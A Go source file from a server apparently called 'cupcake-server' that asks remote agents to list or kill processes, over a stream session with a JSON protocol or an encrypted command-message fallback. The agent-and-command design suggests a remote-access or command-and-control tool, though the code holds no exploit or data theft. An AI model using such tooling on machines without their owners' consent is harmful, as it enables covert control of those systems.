package services

import (
	"cupcake-server/pkg/globals"
	"encoding/json"
	"fmt"
	"io"
	"time"
)

// Protocol Structs (Match Agent's JSON)
type ProcRequest struct {
	Action string `json:"action"` // "ps", "kill"
	Pid    int    `json:"pid,omitempty"`
}

type ProcessEntry struct {
	Pid  int    `json:"pid"`
	Ppid int    `json:"ppid"`
	Name string `json:"name"`
	User string `json:"user,omitempty"`
	Arch string `json:"arch,omitempty"`
}

type ProcResponse struct {
	Status    string         `json:"status"`
	Error     string         `json:"error,omitempty"`
	Processes []ProcessEntry `json:"processes,omitempty"`
}

func ListProcesses(agentID string) ([]ProcessEntry, error) {
	resp, err := executeProcCommand(agentID, ProcRequest{Action: "ps"})
	if err != nil {
		return nil, err
	}
	return resp.Processes, nil
}

func KillProcess(agentID string, pid int) error {
	_, err := executeProcCommand(agentID, ProcRequest{Action: "kill", Pid: pid})
	return err
}

func executeProcCommand(agentID string, req ProcRequest) (*ProcResponse, error) {
	session, exists := GetAgentSession(agentID)
	if !exists {
		return executeProcCommandFallback(agentID, req)
	}

	stream, err := session.Open()
	if err != nil {
		return executeProcCommandFallback(agentID, req)
	}
	defer stream.Close()

	// 1. Send Header (0x04 for Process)
	if _, err := stream.Write([]byte{0x04}); err != nil {
		return nil, err
	}

	// ⚡️ FIX: Send Raw JSON
	if err := json.NewEncoder(stream).Encode(req); err != nil {
		return nil, fmt.Errorf("failed to send proc request: %v", err)
	}

	// 2. Read Response - ROBUST MODE (Read all until EOF then unmarshal)
	stream.SetReadDeadline(time.Now().Add(10 * time.Second))
	
	data, err := io.ReadAll(stream)
	if err != nil {
		return nil, fmt.Errorf("read stream failed: %v", err)
	}

	var resp ProcResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("unmarshal failed: %v | Raw: %s", err, string(data))
	}

	if resp.Status == "error" {
		return nil, fmt.Errorf("agent error: %s", resp.Error)
	}

	return &resp, nil
}

func executeProcCommandFallback(agentID string, req ProcRequest) (*ProcResponse, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	cmdType := ""
	cmdContent := ""
	if req.Action == "ps" {
		cmdType = "process_list"
	} else if req.Action == "kill" {
		cmdType = "process_kill"
		cmdContent = fmt.Sprintf("%d", req.Pid)
	}

	reqID := fmt.Sprintf("PROC-%d", time.Now().UnixNano())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: cmdContent,
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, err
	}

	select {
	case res := <-resChan:
		pMap := res.(map[string]interface{})
		var procResp ProcResponse
		procResp.Status = "ok"

		if cmdType == "process_list" {
			if stdout, ok := pMap["stdout"].(string); ok {
				var processes []ProcessEntry
				if err := json.Unmarshal([]byte(stdout), &processes); err == nil {
					procResp.Processes = processes
				} else {
					// Handle cases where stdout might not be strictly JSON but list
					return nil, fmt.Errorf("failed to parse process list output: %s", stdout)
				}
			}
		}

		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return nil, fmt.Errorf("%s", stderr)
		}

		return &procResp, nil
	case <-time.After(15 * time.Second):
		return nil, fmt.Errorf("agent response timeout")
	}
}
